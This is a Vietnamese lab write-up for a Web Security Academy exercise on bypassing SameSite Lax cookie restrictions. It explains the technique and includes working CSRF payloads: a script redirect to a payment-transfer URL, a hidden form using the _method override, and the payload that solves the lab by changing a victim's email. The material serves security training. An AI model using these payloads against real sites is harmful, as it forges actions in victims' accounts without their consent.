# Bypassing SameSite Lax restrictions using GET requests

Trong thực tế, các máy chủ không phải lúc nào cũng khó chịu về việc nhận được GET hay POST request đến một endpoint nhất định, ngay cả những server đang mong đợi một form submission. Nếu server cũng sử dụng các Lax restrictions cho session cookie của họ, rõ ràng hoặc do mặc định của trình duyệt, bạn vẫn có thể thực hiện một cuộc tấn công CSRF bằng cách gợi ra GET request từ trình duyệt của nạn nhân.

Miễn là request liên quan đến một top-level navigation, trình duyệt vẫn sẽ bao gồm session cookie của nạn nhân. Sau đây là một trong những cách tiếp cận đơn giản nhất để khởi động một cuộc tấn công như vậy:

    <script>
        document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
    </script>

# Bypassing SameSite Lax restrictions using GET requests - Continued

Ngay cả khi GET request thông thường không được phép, một số frameworks cung cấp các cách ghi đè method được chỉ định trong request line. Ví dụ, Symfony hỗ trợ tham số *_method* trong forms, được ưu tiên hơn method thông thường cho mục đích định tuyến:

    <form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
        <input type="hidden" name="_method" value="GET">
        <input type="hidden" name="recipient" value="hacker">
        <input type="hidden" name="amount" value="1000000">
    </form>


Các framework khác hỗ trợ một loạt các tham số tương tự.

# Lab: SameSite Lax bypass via method override
![img](https://imgur.com/0IIf9QP.png)

### Web page: 
![img](https://imgur.com/K0VsB0f.png)

### Solution:

Log in vào account được cấp wiener:peter:

![img](https://imgur.com/g5YMUT4.png)

Trước khi Update email, mở Burp Suite và Intercept request: 

![img](https://imgur.com/0gc6SfI.png)

Nhận thấy request không chứa bất kỳ unpredictable tokens nào, nên có thể dễ bị tấn công CSRF.

Trong login request, nhận thấy trong response Set-Cookie header không được set bất kỳ SameSite restriction nào, nên Lax restriction sẽ được set theo mặc định: 

![img](https://imgur.com/0x5kNMy.png)

--> Nhận ra rằng điều này có nghĩa là session cookie sẽ được gửi trong cross-site GET request, miễn là chúng liên quan đến top-level navigation.

Thử thay đổi change email request từ POST thành GET method: 

![img](https://imgur.com/OPucYNO.png)

Response cho GET request: 

![img](https://imgur.com/0mUV2tM.png)

--> Endpoint chỉ cho phép POST request.

Thử ghi đè method bằng cách thêm *_method* param vào query string: 

*GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/2*

![img](https://imgur.com/SvWcYJv.png)

![img](https://imgur.com/LqGPZYL.png)

--> Thành công change email.

Truy cập Go to exploit server:

![img](https://imgur.com/35vlANU.png)

Tạo HTML/JavaScript payload chứa trình duyệt của người xem để đưa ra GET request độc hại. Payload này phải gây ra top-level navigation để bao gồm session cookie: 

    <script>
        document.location = "https://0aff006f03f26ded85d5b9ce005700c9.web-security-academy.net/my-account/change-email?email=wiener@test1.com&_method=POST";
    </script>

Click Deliver exploit to victim.

Solved the lab!

![img](https://imgur.com/yFv9Bnr.png)